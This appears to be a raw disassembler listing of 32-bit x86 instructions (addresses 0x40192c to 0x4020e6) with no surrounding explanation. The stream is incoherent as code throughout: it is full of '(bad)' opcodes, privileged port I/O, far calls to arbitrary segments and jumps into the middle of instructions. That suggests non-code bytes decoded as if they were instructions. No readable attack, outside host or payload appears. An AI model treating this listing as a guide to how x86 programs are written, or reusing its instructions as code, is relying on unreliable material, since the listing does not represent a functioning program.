  40192c:	xor    DWORD PTR [esi],0xffffffc5
  40192f:	mov    BYTE PTR [esi+edx*8-0x2c],ah
  401933:	ret    0xe750
  401936:	aad    0xc1
  401938:	clc    
  401939:	cmp    dh,BYTE PTR [ecx]
  40193b:	fnsave [edx]
  40193d:	sub    bl,BYTE PTR [esi-0x2ddbb9f3]
  401943:	xor    BYTE PTR [ecx+0x5],dl
  401946:	das    
  401947:	push   ecx
  401948:	aas    
  401949:	mov    DWORD PTR [esi],ecx
  40194b:	adc    BYTE PTR gs:[ebp-0x47a4843d],bh
  401952:	jecxz  0x4018d9
  401954:	mov    ebx,ecx
  401956:	addr16 ja 0x401963
  401959:	sti    
  40195a:	ud2    
  40195c:	jg     0x4019d4
  40195e:	xlat   BYTE PTR ds:[ebx]
  40195f:	cmp    eax,0x3989e612
  401964:	sub    ah,cl
  401966:	scas   al,BYTE PTR es:[edi]
  401967:	loope  0x4019ca
  401969:	or     al,0xf0
  40196b:	sub    ecx,DWORD PTR [ebx]
  40196d:	pop    ebx
  40196e:	dec    esp
  40196f:	mov    bl,0x44
  401971:	pop    esp
  401972:	push   esp
  401973:	adc    eax,0xd8a21b2e
  401978:	mov    eax,ds:0x63e312d2
  40197d:	(bad)  
  40197e:	mov    ebp,0xf623f10e
  401983:	shl    al,1
  401985:	in     al,0xd7
  401987:	cmp    ah,ah
  401989:	and    BYTE PTR [ebp-0x4552977d],dh
  40198f:	mov    eax,ds:0xdd586139
  401994:	and    eax,0x5c1755e8
  401999:	test   eax,0x6c5c231d
  40199e:	adc    DWORD PTR [edx+0x4d0e43bf],esi
  4019a4:	neg    BYTE PTR [ecx+ecx*8]
  4019a7:	cmc    
  4019a8:	scas   al,BYTE PTR es:[edi]
  4019a9:	adc    BYTE PTR [esi+eax*4],0xba
  4019ad:	jl     0x401946
  4019af:	call   0xcee4:0xc1558fd3
  4019b6:	outs   dx,DWORD PTR ds:[esi]
  4019b7:	mov    ah,0xb6
  4019b9:	fisttp WORD PTR [eax+edx*8+0x5e]
  4019bd:	jge    0x401980
  4019bf:	sub    eax,0x3a2aa134
  4019c4:	adc    al,0x93
  4019c6:	push   esp
  4019c7:	popa   
  4019c8:	mov    eax,0xabc2c2a8
  4019cd:	cmc    
  4019ce:	daa    
  4019cf:	in     eax,dx
  4019d0:	add    DWORD PTR [esi],ebp
  4019d2:	aas    
  4019d3:	cli    
  4019d4:	int3   
  4019d5:	and    esp,eax
  4019d7:	mov    eax,ds:0x1b915c8f
  4019dc:	mov    bl,ah
  4019de:	test   al,0x59
  4019e0:	imul   ebx,DWORD PTR [edx],0x7edc7e87
  4019e6:	push   edi
  4019e7:	jb     0x4019d4
  4019e9:	ins    BYTE PTR es:[edi],dx
  4019ea:	sbb    ah,BYTE PTR [edx-0x6d0e9c83]
  4019f0:	mov    edx,0x6ad30c05
  4019f5:	add    al,0xfd
  4019f7:	fsub   st,st(6)
  4019f9:	adc    BYTE PTR [eax],dh
  4019fb:	test   eax,0xf0ec5ebd
  401a00:	out    dx,al
  401a01:	loope  0x401a22
  401a03:	jno    0x401a1d
  401a05:	adc    eax,0xe21394c1
  401a0a:	call   0x74cba3bf
  401a0f:	inc    edi
  401a10:	mov    ds,WORD PTR [edx]
  401a12:	pop    ecx
  401a13:	push   ss
  401a14:	xchg   edi,eax
  401a15:	test   al,0x49
  401a17:	fbld   TBYTE PTR [ecx+0x68e9205]
  401a1d:	add    esp,DWORD PTR [edx]
  401a1f:	bound  ebx,QWORD PTR [edx]
  401a21:	pop    edi
  401a22:	sbb    al,0x8c
  401a24:	sbb    BYTE PTR [edx+ebp*4+0x42],bh
  401a28:	das    
  401a29:	ror    dl,cl
  401a2b:	sub    DWORD PTR [edx+ebp*8+0x51f8c229],ebp
  401a32:	out    0xf,al
  401a34:	ds jnp 0x401a91
  401a37:	push   edi
  401a38:	xor    eax,DWORD PTR [ecx]
  401a3a:	pop    ss
  401a3b:	sbb    al,0x20
  401a3d:	mov    WORD PTR [ebx-0x396f10b0],?
  401a43:	(bad)  
  401a44:	jg     0x401a13
  401a46:	sbb    bh,BYTE PTR [ecx]
  401a48:	xlat   BYTE PTR ds:[ebx]
  401a49:	rol    DWORD PTR [edi-0x3e],1
  401a4c:	popa   
  401a4d:	sbb    eax,0x6e4a2619
  401a52:	jmp    0xc173:0xd83b4e02
  401a59:	jecxz  0x401a6e
  401a5b:	push   edi
  401a5c:	cmp    bl,BYTE PTR [esi-0x2a21ae1d]
  401a62:	or     al,0x4
  401a64:	add    DWORD PTR [ecx-0x17],edi
  401a67:	pop    ecx
  401a68:	jp     0x401a1c
  401a6a:	pop    ebx
  401a6b:	pop    esi
  401a6c:	stos   DWORD PTR es:[edi],eax
  401a6d:	dec    ecx
  401a6e:	xor    DWORD PTR [ebp+0x616b1211],ebp
  401a74:	mov    BYTE PTR [eax-0x66],cl
  401a77:	jle    0x401a85
  401a79:	adc    DWORD PTR [ebx-0x4531e5d3],ebp
  401a7f:	retf   
  401a80:	out    dx,eax
  401a81:	lahf   
  401a82:	jl     0x401a29
  401a84:	jmp    0x31fdf0e
  401a89:	fwait
  401a8a:	cmc    
  401a8b:	sbb    ch,dl
  401a8d:	in     eax,0xfd
  401a8f:	xor    BYTE PTR [ecx+0x31],0x83
  401a93:	sbb    eax,0x6d70cd2e
  401a98:	hlt    
  401a99:	add    DWORD PTR [ecx+0x4bdef9cd],edx
  401a9f:	icebp  
  401aa0:	mov    ss,WORD PTR [edx-0x3d]
  401aa3:	arpl   WORD PTR [edx+0x5b],cx
  401aa6:	jns    0x401a3c
  401aa8:	test   ebx,eax
  401aaa:	jge    0x401af9
  401aac:	and    ah,ah
  401aae:	shl    esi,0x73
  401ab1:	mov    esp,0x9e41a216
  401ab6:	jmp    0x401a98
  401ab8:	lfs    ecx,FWORD PTR [eax]
  401abb:	adc    bh,bl
  401abd:	sub    BYTE PTR [edx+0x6c],al
  401ac0:	dec    ecx
  401ac1:	mov    WORD PTR fs:[ebx],ds
  401ac4:	add    eax,0xca4b7f22
  401ac9:	stos   DWORD PTR es:[edi],eax
  401aca:	jmp    0x8102:0x65f080b6
  401ad1:	call   0x707d:0x122fc4cc
  401ad8:	inc    esp
  401ad9:	sub    cl,BYTE PTR [ebp+0x21]
  401adc:	cld    
  401add:	push   ss
  401ade:	xor    BYTE PTR [edi-0x9c5df79],ah
  401ae4:	cmp    ebx,DWORD PTR [edx+ebp*4]
  401ae7:	adc    ecx,DWORD PTR [ebx-0x373d029b]
  401aed:	imul   eax,DWORD PTR [esp+edi*8+0x59],0xf
  401af2:	mov    dh,0x5f
  401af4:	(bad)  
  401af5:	sti    
  401af6:	inc    esi
  401af7:	shl    ecx,0x6f
  401afa:	pop    esi
  401afb:	jb     0x401b04
  401afd:	mov    DWORD PTR [edx],ecx
  401aff:	out    dx,eax
  401b00:	in     eax,0x43
  401b02:	retf   
  401b03:	outs   dx,BYTE PTR ds:[esi]
  401b04:	not    ecx
  401b06:	stc    
  401b07:	test   DWORD PTR [edi+0x63],esi
  401b0a:	ficom  DWORD PTR [ecx+0x4095fce]
  401b10:	retf   
  401b11:	sub    ch,0x23
  401b14:	loope  0x401b37
  401b16:	stc    
  401b17:	mov    DWORD PTR [esp+edx*4],ecx
  401b1a:	pop    ebx
  401b1b:	pop    esi
  401b1c:	xchg   ebx,eax
  401b1d:	pop    esi
  401b1e:	scas   eax,DWORD PTR es:[edi]
  401b1f:	mov    ebx,DWORD PTR [ebp+0x38]
  401b22:	fs xchg edi,eax
  401b24:	inc    ebp
  401b25:	ss mov esi,0xa711b025
  401b2b:	inc    edx
  401b2c:	in     al,0xfa
  401b2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b2f:	test   eax,0x4995f1af
  401b34:	fsubr  st,st(1)
  401b36:	(bad)
  401b3a:	mov    ebp,0x64d2647d
  401b3f:	aam    0xb
  401b41:	lahf   
  401b42:	gs inc edx
  401b44:	and    DWORD PTR [edi+0x21],esi
  401b47:	push   0x16
  401b49:	xchg   DWORD PTR [ebp-0xb013c35],eax
  401b4f:	mov    cl,0xe
  401b51:	cmp    DWORD PTR [ebx],ebx
  401b53:	xchg   ebp,eax
  401b54:	sub    al,0x56
  401b56:	adc    al,0x56
  401b58:	fbld   TBYTE PTR [ebp-0x5b1000f8]
  401b5e:	cmp    DWORD PTR [ebx+esi*4-0x1b],edi
  401b62:	int3   
  401b63:	pop    edx
  401b64:	int    0xef
  401b66:	and    BYTE PTR [ecx],0xf8
  401b69:	xchg   ecx,eax
  401b6a:	jg     0x401b00
  401b6c:	push   esi
  401b6d:	scas   eax,DWORD PTR es:[edi]
  401b6e:	pop    edx
  401b6f:	sbb    al,0x69
  401b71:	in     al,dx
  401b72:	xor    al,0x79
  401b74:	xchg   ebp,eax
  401b75:	leave  
  401b76:	lock jb 0x401b47
  401b79:	pusha  
  401b7a:	dec    edx
  401b7b:	unpckhps xmm3,xmm2
  401b7e:	pop    ebx
  401b7f:	out    0xae,al
  401b81:	cwde   
  401b82:	or     ecx,DWORD PTR [edi+edx*8+0x552f4c5e]
  401b89:	or     al,0xf5
  401b8b:	faddp  st(6),st
  401b8d:	out    dx,eax
  401b8e:	sti    
  401b8f:	dec    esi
  401b90:	add    al,0x50
  401b92:	pop    es
  401b93:	jae    0x401b48
  401b95:	test   eax,0x338237e6
  401b9a:	dec    ecx
  401b9b:	sub    al,0xd9
  401b9d:	adc    DWORD PTR [ebp+0x35e54707],0x3a
  401ba4:	fcmovb st,st(2)
  401ba6:	je     0x401b62
  401ba8:	rcl    si,cl
  401bab:	je     0x401bf7
  401bad:	es sbb cl,0x95
  401bb1:	mov    ecx,edi
  401bb3:	fadd   DWORD PTR [ebp+0x39bee33]
  401bb9:	mov    al,ds:0x38e3c1e7
  401bbe:	scas   eax,DWORD PTR es:[edi]
  401bbf:	imul   ebp,DWORD PTR [ecx],0xffffffd3
  401bc2:	(bad)  
  401bc3:	(bad)  
  401bc4:	fs stc 
  401bc6:	push   0xfbc54e0e
  401bcb:	scas   al,BYTE PTR es:[edi]
  401bcc:	scas   al,BYTE PTR es:[edi]
  401bcd:	shr    BYTE PTR [eax],0x78
  401bd0:	xor    edi,edx
  401bd2:	jmp    0x401c30
  401bd4:	mov    ds:0x85c6e3d7,eax
  401bd9:	dec    edx
  401bda:	and    cl,cl
  401bdc:	mov    ds:0xcdeb45e3,eax
  401be1:	retf   0x1ad8
  401be4:	ror    ecx,0x6d
  401be7:	mov    dh,0x54
  401be9:	daa    
  401bea:	arpl   WORD PTR [edx-0x25],cx
  401bed:	stos   BYTE PTR es:[edi],al
  401bee:	and    esi,DWORD PTR [ecx-0x585958a3]
  401bf4:	rcr    DWORD PTR [ebp-0x4d7607d6],0xc4
  401bfb:	push   esp
  401bfc:	sbb    BYTE PTR [edx],bh
  401bfe:	ds push ebx
  401c00:	add    al,BYTE PTR [ecx+0x7b]
  401c03:	or     DWORD PTR [esi-0x51fc0773],ebx
  401c09:	mov    WORD PTR [ebx-0x172309],ds
  401c0f:	push   ss
  401c10:	add    BYTE PTR [ebx-0x7d],dh
  401c13:	dec    ecx
  401c14:	popa   
  401c15:	pusha  
  401c16:	aad    0x63
  401c18:	mov    bh,0x7a
  401c1a:	stc    
  401c1b:	mov    esi,0xb1f16ea8
  401c20:	repz sub BYTE PTR [edx+esi*2],ch
  401c24:	out    0xf6,al
  401c26:	stos   DWORD PTR es:[edi],eax
  401c27:	gs push ss
  401c29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c2a:	inc    ebx
  401c2b:	cld    
  401c2c:	pop    ecx
  401c2d:	add    eax,0xa7c0eb2c
  401c32:	or     dl,BYTE PTR [ebx-0x7ba79249]
  401c38:	rep lods al,BYTE PTR ds:[esi]
  401c3a:	cli    
  401c3b:	inc    esp
  401c3c:	sub    edx,DWORD PTR [edi+eiz*2+0x1698d691]
  401c43:	in     al,dx
  401c44:	imul   ecx,DWORD PTR [edx+eax*1-0x64],0x2bc0fc10
  401c4c:	inc    ecx
  401c4d:	loop   0x401c42
  401c4f:	lahf   
  401c50:	cmp    cl,BYTE PTR [ecx+0x2a]
  401c53:	test   BYTE PTR [ecx-0x453a9e55],al
  401c59:	xlat   BYTE PTR ds:[ebx]
  401c5a:	mov    esp,0x632b5bac
  401c5f:	dec    ecx
  401c60:	(bad)  [ebx]
  401c62:	popa   
  401c63:	and    DWORD PTR [esi-0x37ca32eb],0x4d
  401c6a:	mov    ebx,0x52ca0c0f
  401c6f:	or     edi,DWORD PTR [ecx]
  401c71:	(bad)  
  401c73:	xchg   dl,bh
  401c75:	sar    BYTE PTR [ebx-0x869580b],0xff
  401c7c:	cs arpl si,di
  401c7f:	pop    ss
  401c80:	jl     0x401c0c
  401c82:	sbb    esp,DWORD PTR [ecx+0x7e268c51]
  401c88:	mov    gs,WORD PTR [edi]
  401c8a:	stos   BYTE PTR es:[edi],al
  401c8b:	push   ecx
  401c8c:	fs xchg ebx,eax
  401c8e:	push   ds
  401c8f:	pop    es
  401c90:	sbb    ch,BYTE PTR [ebx-0x48435d2e]
  401c96:	jge    0x401c3d
  401c98:	pop    ebp
  401c99:	pop    ecx
  401c9a:	(bad)  
  401c9b:	and    eax,0xc4f73192
  401ca0:	lds    ecx,FWORD PTR [eax+0x7e]
  401ca3:	loope  0x401c34
  401ca5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ca7:	mov    BYTE PTR [ecx],bh
  401ca9:	cmp    dh,ah
  401cab:	push   esi
  401cac:	xchg   esp,eax
  401cad:	mov    ah,0x1d
  401caf:	inc    esi
  401cb0:	mov    dl,0x35
  401cb2:	int    0x32
  401cb4:	mov    al,ds:0xdd2882bb
  401cb9:	ss pop es
  401cbb:	pop    ebp
  401cbc:	out    dx,eax
  401cbd:	jo     0x401cdb
  401cbf:	xlat   BYTE PTR ds:[ebx]
  401cc0:	jle    0x401cfb
  401cc2:	jae    0x401c88
  401cc4:	adc    DWORD PTR [eax],0xc
  401cc7:	scas   eax,DWORD PTR es:[edi]
  401cc8:	add    esp,DWORD PTR ds:0xefa5799b
  401cce:	cdq    
  401ccf:	mov    ecx,0x9a7fe247
  401cd4:	inc    esp
  401cd5:	or     ebp,esi
  401cd7:	cmp    DWORD PTR [eax+0x9c4fa21],ebp
  401cdd:	mov    WORD PTR [ecx-0x54e3560e],?
  401ce3:	pop    edx
  401ce4:	cmc    
  401ce5:	pop    edi
  401ce6:	jmp    0x401d30
  401ce8:	jbe    0x401d4b
  401cea:	jb     0x401d26
  401cec:	fld    QWORD PTR [edx]
  401cef:	mov    al,ds:0xd9f93df8
  401cf4:	sbb    al,0xb3
  401cf6:	shl    BYTE PTR [edx+0x1ed2af52],1
  401cfc:	cli    
  401cfd:	cmp    eax,0x4dd1618a
  401d02:	aaa    
  401d03:	sub    BYTE PTR [ebx+0x47e0428e],ch
  401d09:	add    cl,0x58
  401d0c:	loop   0x401d17
  401d0e:	xchg   DWORD PTR [ebp-0x9972ab8],esp
  401d14:	(bad)  
  401d15:	cmp    al,0x35
  401d17:	les    ebx,FWORD PTR [ecx-0x7f180988]
  401d1d:	push   ds
  401d1e:	cdq    
  401d1f:	call   0x9cc04f96
  401d24:	adc    eax,0xa1ed2e0
  401d29:	es sub al,0xa6
  401d2c:	pop    ecx
  401d2d:	mov    ch,BYTE PTR [eax+0x2ba7ca01]
  401d33:	push   es
  401d34:	rol    cl,0xa6
  401d37:	lahf   
  401d38:	icebp  
  401d39:	test   BYTE PTR [edx+0x7e],cl
  401d3c:	or     BYTE PTR [esi+0x79],0xa8
  401d40:	aaa    
  401d41:	cwde   
  401d42:	jno    0x401d9f
  401d44:	jne    0x401d56
  401d46:	inc    eax
  401d47:	cmp    DWORD PTR [esi],esi
  401d49:	fstp   DWORD PTR [ebx+0x45]
  401d4c:	aad    0xa
  401d4e:	out    0xed,eax
  401d50:	in     al,0xd5
  401d52:	pop    ebx
  401d53:	enter  0x95b8,0xc4
  401d57:	and    ebx,DWORD PTR [edx+0x56c9d64]
  401d5d:	push   esi
  401d5e:	fidivr WORD PTR [edx+0xc9eb003]
  401d64:	jmp    0x401d09
  401d66:	in     eax,dx
  401d67:	xlat   BYTE PTR ds:[ebx]
  401d68:	push   edi
  401d69:	std    
  401d6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d6b:	xor    DWORD PTR [esi],ebp
  401d6d:	cwde   
  401d6e:	or     ebp,DWORD PTR [ecx-0x11]
  401d71:	retf   0x42d4
  401d74:	shl    ecx,cl
  401d76:	dec    esi
  401d77:	and    DWORD PTR [eax],ebp
  401d79:	xchg   esp,ecx
  401d7b:	cs in  eax,dx
  401d7d:	mov    ch,cl
  401d7f:	and    al,0x9a
  401d81:	pop    esp
  401d82:	cmp    DWORD PTR [edx+eax*4-0x36d795d6],ecx
  401d89:	and    eax,0xc07d4706
  401d8e:	adc    bl,0x16
  401d91:	or     BYTE PTR [eax+eax*1-0x51],0xc3
  401d96:	inc    edi
  401d97:	aaa    
  401d98:	scas   al,BYTE PTR es:[edi]
  401d99:	pop    es
  401d9a:	imul   ah
  401d9c:	sbb    eax,0x50a79122
  401da1:	jle    0x401d3e
  401da3:	jge    0x401dcf
  401da5:	xchg   ebp,eax
  401da6:	ins    BYTE PTR es:[edi],dx
  401da7:	mov    ds:0x5283665a,eax
  401dac:	repnz adc cl,BYTE PTR [ecx-0x249c63ba]
  401db3:	(bad)  
  401db4:	fadd   st(1),st
  401db6:	dec    eax
  401db7:	(bad)  
  401db8:	jge    0x401d4b
  401dba:	adc    dl,BYTE PTR [eax]
  401dbc:	lods   al,BYTE PTR ds:[esi]
  401dbd:	mov    bh,0x7d
  401dbf:	fnsave [edi+0x47cb452a]
  401dc5:	ret    0x66bb
  401dc8:	loope  0x401e15
  401dca:	xchg   ebx,eax
  401dcb:	inc    ebp
  401dcc:	dec    ebx
  401dcd:	mov    ebp,0x3195209c
  401dd2:	push   esp
  401dd3:	jnp    0x401e3a
  401dd5:	xchg   edi,eax
  401dd6:	nop
  401dd7:	pop    edx
  401dd8:	and    BYTE PTR [edx],al
  401dda:	bound  esi,QWORD PTR [eax]
  401ddc:	stos   DWORD PTR es:[edi],eax
  401ddd:	xor    BYTE PTR [ebp-0x9],ch
  401de0:	popa   
  401de1:	sahf   
  401de2:	push   ebp
  401de3:	add    bh,bh
  401de5:	mov    bl,0x6a
  401de7:	push   esi
  401de8:	outs   dx,DWORD PTR ds:[esi]
  401de9:	pop    ebx
  401dea:	jmp    0xd702eade
  401def:	test   BYTE PTR [ecx],al
  401df1:	sub    BYTE PTR [edi-0x7e],0xe7
  401df5:	test   DWORD PTR ds:0xce6fef9f,eax
  401dfb:	cli    
  401dfc:	in     eax,dx
  401dfd:	or     esp,esi
  401dff:	push   cs
  401e00:	sbb    dh,0x3b
  401e03:	sbb    bh,dh
  401e05:	fmul   QWORD PTR [edi]
  401e07:	xor    BYTE PTR [ecx-0x2b],al
  401e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e0b:	rcl    DWORD PTR [ecx-0x2bdd1833],1
  401e11:	push   0x7a7a7e8d
  401e16:	(bad)  
  401e17:	iret   
  401e18:	gs es call 0xfbbf:0xa10ce3b0
  401e21:	add    BYTE PTR [eax],0xe3
  401e24:	cmp    edx,DWORD PTR [esp+edi*2+0xe9ecb0]
  401e2b:	dec    ecx
  401e2c:	mov    ah,ch
  401e2e:	push   ebx
  401e2f:	jb     0x401e01
  401e31:	jbe    0x401db5
  401e33:	enter  0x3da5,0xbc
  401e37:	imul   ebp,DWORD PTR [ebx],0x506bb9d1
  401e3d:	sub    DWORD PTR fs:[ebx-0x7a9067f8],esp
  401e44:	cdq    
  401e45:	div    BYTE PTR [eax-0x5391d7d5]
  401e4b:	cs aad 0x71
  401e4e:	fidivr WORD PTR ds:0xacabff5b
  401e54:	mov    WORD PTR [ebp+0x6c],ds
  401e57:	or     al,0x3b
  401e59:	xchg   edi,eax
  401e5a:	pop    ebp
  401e5b:	arpl   WORD PTR [eax+eiz*4],bx
  401e5e:	inc    ecx
  401e5f:	inc    ecx
  401e60:	sar    dh,1
  401e62:	mov    al,BYTE PTR [edx+0x36]
  401e65:	shl    BYTE PTR [ecx+edi*2-0x2d],1
  401e69:	adc    ah,BYTE PTR [edi+edi*2-0x7e]
  401e6d:	cmp    eax,0xba02e1c
  401e72:	pop    ss
  401e73:	pop    ds
  401e74:	fwait
  401e75:	test   eax,0x5aaf119c
  401e7a:	lods   eax,DWORD PTR ds:[esi]
  401e7b:	pushf  
  401e7c:	loope  0x401ea3
  401e7e:	adc    eax,0xee95b013
  401e83:	sbb    al,dh
  401e85:	inc    ebx
  401e86:	and    eax,0x2ad94ada
  401e8b:	sbb    ch,BYTE PTR ds:0x3d843a35
  401e91:	cmp    DWORD PTR [ecx],0x5e
  401e94:	add    DWORD PTR [edx+0x47d90660],ebx
  401e9a:	mov    cl,0x5e
  401e9c:	int    0xe2
  401e9e:	repnz mov bl,0x73
  401ea1:	pop    esi
  401ea2:	cmp    DWORD PTR [ebp+0x1c2bf6c4],esi
  401ea8:	xor    DWORD PTR [edx+0xa119906],edi
  401eae:	lods   eax,DWORD PTR ds:[esi]
  401eaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401eb0:	jl     0x401ed7
  401eb2:	jne    0x401edf
  401eb4:	daa    
  401eb5:	push   edi
  401eb6:	pop    ecx
  401eb7:	mov    al,ds:0x6c7eb77e
  401ebc:	mov    ebx,0xbb0d6b52
  401ec1:	test   eax,0x78f9a835
  401ec6:	inc    ebp
  401ec7:	mov    ecx,DWORD PTR ds:0x62c43fe9
  401ecd:	bnd jmp 0x401e79
  401ed0:	mov    ecx,0x8f98652f
  401ed5:	mov    ebx,DWORD PTR [esi+0x42ab24]
  401edb:	mov    ds:0xf60086f7,eax
  401ee0:	iret   
  401ee1:	(bad)  
  401ee2:	jno    0x401eeb
  401ee4:	jg     0x401eed
  401ee6:	inc    eax
  401ee7:	lds    ecx,FWORD PTR gs:0xb94e1d2
  401eee:	fiadd  WORD PTR [ebp+0x6c]
  401ef1:	jle    0x401ef0
  401ef3:	icebp  
  401ef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ef5:	push   esi
  401ef6:	pop    ecx
  401ef7:	xor    DWORD PTR [edi-0x58],ebx
  401efa:	imul   ecx,DWORD PTR [edx],0xffffffc9
  401efd:	inc    esp
  401efe:	je     0x401e9a
  401f00:	outs   dx,DWORD PTR ds:[esi]
  401f01:	cld    
  401f02:	fsubp  st(5),st
  401f04:	cmp    DWORD PTR [edx-0x50],0xffffffc0
  401f08:	or     esp,DWORD PTR [ecx]
  401f0a:	gs mov ebp,0x8c10de51
  401f10:	aas    
  401f11:	or     BYTE PTR [ebp+eiz*1-0x78],dh
  401f15:	xor    DWORD PTR [ecx-0x3d],esi
  401f18:	dec    ebp
  401f19:	jle    0x401ea7
  401f1b:	addr16 retf 
  401f1d:	xchg   ebx,eax
  401f1e:	lods   al,BYTE PTR ds:[esi]
  401f1f:	lods   al,BYTE PTR ds:[esi]
  401f20:	aas    
  401f21:	mov    dl,0x3d
  401f23:	cmp    al,0xa1
  401f25:	push   ebp
  401f26:	repz xor BYTE PTR [ebp+0x2a191fa9],bh
  401f2d:	xchg   esp,eax
  401f2e:	cmp    edx,DWORD PTR [ebp-0x5]
  401f31:	push   es
  401f32:	stc    
  401f33:	mov    ds,WORD PTR [eax]
  401f35:	or     al,0x6c
  401f37:	inc    ebp
  401f38:	adc    al,0x5a
  401f3a:	fimul  WORD PTR ds:0xe9ef7b70
  401f40:	scas   al,BYTE PTR es:[edi]
  401f41:	mov    bh,dh
  401f43:	mov    esi,DWORD PTR [ebx-0x62e059de]
  401f49:	xchg   esp,eax
  401f4a:	mov    DWORD PTR [ebx+0x3abc52d4],ebp
  401f50:	data16 lock cmp dl,al
  401f54:	(bad)  
  401f55:	cdq    
  401f56:	popa   
  401f57:	mov    ebx,0xe33db7c3
  401f5c:	pop    esp
  401f5d:	push   DWORD PTR [ecx-0x19]
  401f60:	scas   eax,DWORD PTR es:[edi]
  401f61:	(bad)  
  401f63:	and    eax,0x78eb1723
  401f68:	or     ebp,esi
  401f6a:	pop    esi
  401f6b:	pop    ds
  401f6c:	jb     0x401fd1
  401f6e:	push   esi
  401f6f:	(bad)  
  401f70:	lahf   
  401f71:	shl    ah,cl
  401f73:	jmp    FWORD PTR ds:0x411fa2ae
  401f79:	shl    DWORD PTR [bp+di],cl
  401f7c:	cmc    
  401f7d:	mov    ah,0xc0
  401f7f:	dec    bp
  401f81:	cmp    BYTE PTR [eax+0xd],ch
  401f84:	pop    ebx
  401f85:	fbld   TBYTE PTR [eax+0x48]
  401f88:	add    al,0x50
  401f8a:	cli    
  401f8b:	dec    eax
  401f8c:	fidivr WORD PTR [edi]
  401f8e:	mov    ebp,0x836f8c45
  401f93:	cli    
  401f94:	fild   WORD PTR [esi+ebx*2-0x6d5d0a74]
  401f9b:	(bad)  
  401f9c:	hlt    
  401f9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f9e:	aam    0x7d
  401fa0:	xor    BYTE PTR [ebp-0x41],cl
  401fa3:	mov    esp,0xc665dc44
  401fa8:	adc    BYTE PTR [esi],ah
  401faa:	nop
  401fab:	les    esp,FWORD PTR [ebp+0x14]
  401fae:	sahf   
  401faf:	pop    edi
  401fb0:	mov    al,bl
  401fb2:	jmp    0x401f58
  401fb4:	sbb    al,0x94
  401fb6:	jmp    0xcea60978
  401fbb:	mov    esp,0xbdbafcf9
  401fc0:	pop    ss
  401fc1:	jbe    0x402015
  401fc3:	mov    dh,0x1e
  401fc5:	mov    al,ds:0xb5d2bb4b
  401fca:	cmp    bh,BYTE PTR [edx+0xf]
  401fcd:	enter  0xf51a,0xdc
  401fd1:	call   0xe5c4929e
  401fd6:	mov    cl,0x90
  401fd8:	and    DWORD PTR [edx+0x3f670a1e],ebp
  401fde:	and    ebx,edx
  401fe0:	pop    es
  401fe1:	inc    ebp
  401fe2:	cs dec ebx
  401fe4:	mov    eax,0x3905c876
  401fe9:	add    esp,DWORD PTR ds:0xccf243f6
  401fef:	aas    
  401ff0:	mov    eax,ss
  401ff2:	cwde   
  401ff3:	mov    WORD PTR [eax],es
  401ff5:	push   eax
  401ff6:	mov    bl,0x53
  401ff8:	pop    eax
  401ff9:	icebp  
  401ffa:	mov    al,0xe1
  401ffc:	mov    bl,0xaa
  401ffe:	push   esp
  401fff:	dec    edi
  402000:	ret    
  402001:	mov    dl,0xdf
  402003:	in     al,dx
  402004:	loop   0x40202e
  402006:	add    eax,0x57c79745
  40200b:	add    DWORD PTR ds:0xd47a098c,edi
  402011:	push   eax
  402012:	xor    DWORD PTR [esi-0x5],0x61
  402016:	mov    esi,0x39b000dc
  40201b:	leave  
  40201c:	call   0x1454:0x680d3527
  402023:	and    BYTE PTR [ebp+ecx*2+0x54],ch
  402027:	sti    
  402028:	ret    0x6598
  40202b:	jg     0x402054
  40202d:	not    BYTE PTR [eax+eax*4+0x18cc889e]
  402034:	adc    edx,DWORD PTR ds:0x20b7c876
  40203a:	fldenv [ebp-0x2c]
  40203d:	stc    
  40203e:	shl    BYTE PTR [esi*8+0x2ff0c9ae],0xf
  402046:	ins    DWORD PTR es:[edi],dx
  402047:	scas   eax,DWORD PTR es:[edi]
  402048:	pop    edi
  402049:	xchg   ebx,edx
  40204b:	in     al,0xeb
  40204d:	arpl   WORD PTR [eax+0x55],bp
  402050:	lock sub DWORD PTR [esi+0x3a],esp
  402054:	and    BYTE PTR [edi+ebp*4+0x72c0e078],bh
  40205b:	int    0x83
  40205d:	mov    esi,0x1bbb0900
  402062:	cmp    DWORD PTR [edi+0x6a],0x1ba2e0e2
  402069:	pop    esi
  40206a:	xlat   BYTE PTR ds:[ebx]
  40206b:	inc    edi
  40206c:	icebp  
  40206d:	inc    ebx
  40206e:	sbb    al,0x35
  402070:	retf   
  402071:	ret    0xddc0
  402074:	call   0x30e3:0xb735a9c4
  40207b:	lock lods al,BYTE PTR ds:[esi]
  40207d:	and    DWORD PTR [edx+eiz*1-0x147adfb3],edx
  402084:	fild   DWORD PTR [eax-0x2c]
  402087:	imul   edi,edx,0xef210a1
  40208d:	push   esp
  40208e:	xor    BYTE PTR [esi-0x73],al
  402091:	test   al,0x24
  402093:	mov    ch,BYTE PTR [edi-0x7f]
  402096:	adc    dh,BYTE PTR [esi-0x2bad60aa]
  40209c:	sub    eax,ebp
  40209e:	mov    fs:0xc7d10bbd,al
  4020a4:	sbb    eax,0x5e584f37
  4020a9:	adc    edi,ecx
  4020ab:	xchg   DWORD PTR [ebx+edx*1+0x1c],eax
  4020af:	fucomip st,st(6)
  4020b1:	ficom  WORD PTR [edi+0x1e]
  4020b4:	jae    0x40212f
  4020b6:	stos   BYTE PTR es:[edi],al
  4020b7:	xor    eax,0x78027820
  4020bc:	call   0x8482bdde
  4020c1:	in     eax,0xa5
  4020c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020c4:	inc    edi
  4020c5:	inc    esi
  4020c6:	fwait
  4020c7:	rol    dh,cl
  4020c9:	add    eax,0x72e03f6d
  4020ce:	mov    ?,WORD PTR [ebp+0x466ae756]
  4020d4:	mov    bl,0x9b
  4020d6:	mov    eax,ds:0xc86b2807
  4020db:	and    al,ch
  4020dd:	mov    dl,0x86
  4020df:	test   al,0x69
  4020e1:	pop    edx
  4020e2:	jecxz  0x4020ba
  4020e4:	xchg   esi,eax
  4020e5:	out    dx,al
  4020e6:	xor    BYTE PTR [ebp-0x5d],0x62
